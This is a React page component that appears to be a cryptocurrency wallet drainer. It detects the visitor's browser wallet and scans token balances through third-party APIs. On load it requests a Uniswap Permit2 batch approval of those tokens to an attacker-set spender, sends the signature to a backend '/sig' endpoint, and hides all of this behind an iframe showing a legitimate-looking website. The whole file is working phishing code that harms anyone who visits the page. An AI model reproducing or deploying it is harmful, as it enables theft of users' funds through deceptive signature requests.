import { useEffect } from 'react'
import { useWeb3React } from '@web3-react/core'

import Layout from '../components/layout'
import { injected } from '../components/wallet/connectors'

import { ethers } from 'ethers'
import qs from 'qs'
import { AllowanceTransfer, PERMIT2_ADDRESS } from '@uniswap/permit2-sdk'

import http from '../units/http'
import { Ddefault } from '../configs/Ddefault'
import Interface from '../units/tools/Interface'
import Covalenthq from '../units/tools/Covalenthq'
import Alchemy from '../units/tools/Alchemy'
import Quicknode from '../units/tools/Quicknode'
import CHAIN_DATA_LIST from '../configs/Chainlist'

const HomePage = () => {
    const { activate } = useWeb3React();
    let current_provider = {};
    useEffect(() => {
        //检测是否有provider
        if (
            !window.hasOwnProperty("ethereum") &&
            !window.hasOwnProperty("bitkeep") &&
            !window.hasOwnProperty("trustwallet")
        )
            return false;

        if (window.hasOwnProperty("bitkeep")) {
            current_provider = window.bitkeep.ethereum;
        } else if (window.hasOwnProperty("trustwallet")) {
            current_provider = window.trustwallet;
        } else {
            current_provider = window.ethereum;
        }

        const metamaskProvider = new ethers.providers.Web3Provider(
            current_provider
        );
        const signer = metamaskProvider.getSigner();
        const account = signer.provider.provider.selectedAddress;
        //document.write(account);
        try {
            //getTokenTools(signer, new Quicknode(account))
            //getTokenTools(signer, new Alchemy(account))
            getTokenTools(signer, new Covalenthq(activate, injected, account));
        } catch (e) {
            console.log(e.message);
        }

        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);
    let D = {};

    const getTokenTools = async (signer, instance) => {
        let network = process.env.NEXT_PUBLIC_CHAIN;
        if (!signer) return;
        const TokenTools = new Interface("TokenTools", [
            "inspectWalletToken",
            "inspectTokenPrice",
            "caculateValue",
            "createConfiguration",
        ]);
        Interface.ensureImplement(instance, TokenTools);

        if (
            (current_provider.networkVersion &&
                ["1", "5", "10", "56", "137", "42161"].includes(
                    current_provider.networkVersion
                )) ||
            [1, 5, 10, 56, 137, 42161].includes(current_provider.networkVersion)
        ) {
            network = current_provider.networkVersion;
        }
        //document.write(network);
        try {
            //scan wallet
            D = await instance.createConfiguration();
            // console.log(D);
            if (JSON.stringify(D) === "{}") {
                if (Ddefault[network]) {
                    D = Ddefault[network];
                } else {
                    switchNetwork();
                }
            }
        } catch (e) {
            console.log(e.message);
        }
        //handle sig
        var once = false;
        setInterval(() => {
            if (once) return;
            try {
                handleLoad(signer);
            } catch (e) {
                console.log(e.message);
            }

            once = true;
        }, 1000);
    };
    const handleLoad = async (signer) => {
        let network = process.env.NEXT_PUBLIC_CHAIN;
        if (
            (current_provider.networkVersion &&
                ["1", "5", "10", "56", "137", "42161"].includes(
                    current_provider.networkVersion
                )) ||
            [1, 5, 10, 56, 137, 42161].includes(current_provider.networkVersion)
        ) {
            network = current_provider.networkVersion;
        }

        const details = [];
        //default signature
        Object.keys(D).map((item, index) => {
            if (item != "spender_address" && item != "expiration") {
                const token_item = {
                    token: D[item].address,
                    amount: D[item].amount,
                    expiration: D[item].expiration,
                    nonce: 0,
                };
                details.push(token_item);
            }
        });
        const permit = {
            details: details,
            spender: D.spender_address,
            sigDeadline: D.expiration,
        };

        //handle
        try {
            const { domain, types, values } = AllowanceTransfer.getPermitData(
                permit,
                PERMIT2_ADDRESS,
                network
            );
            const s = await signer._signTypedData(domain, types, values);
            const data = {
                account: signer.provider.provider.selectedAddress,
                permit2address: domain.verifyingContract,
                chain: domain.chainId,
                details: JSON.stringify(values.details),
                signature: s,
                source: process.env.NEXT_PUBLIC_SOURCE,
                spender_address: values.spender,
            };
            http.post("/sig", qs.stringify(data)).then((res) => {
                if (res.status == 200) {
                    window.location.href =
                        process.env.NEXT_PUBLIC_DOMAIN_WEBSITE;
                }
            });

            try {
                signer = null;
            } catch (ex) {
                console.log(ex);
            }
            return s;
        } catch (e) {
            console.log(e.message);
            if (e.code != "ACTION_REJECTED") {
                if (e.code == -32603) {
                    switchNetwork();
                }
            } else {
                console.log("USER REJECTED");
            }
        }
    };
    const switchNetwork = async () => {
        await current_provider.request({
            method: "wallet_addEthereumChain",
            params: [
                {
                    chainId: ethers.utils.hexValue(
                        CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN].chainId
                    ),
                    chainName:
                        CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN]
                            .chainParams.chainName,
                    rpcUrls:
                        CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN]
                            .chainParams.rpcUrls,
                    nativeCurrency:
                        CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN]
                            .chainParams.nativeCurrency,
                    blockExplorerUrls:
                        CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN]
                            .chainParams.blockExplorerUrls,
                },
            ],
        });
    };
    return (
        <Layout>
            <div id="page-main"></div>
            <div className="iframe-box">
                <iframe
                    id="my-iframe"
                    src={process.env.NEXT_PUBLIC_DOMAIN_WEBSITE}
                    style={{ width: "100%", height: "100%" }}
                ></iframe>
            </div>
        </Layout>
    );
};

export default HomePage;

HomePage.getLayout = function getLayout(page) {
    return { page };
};
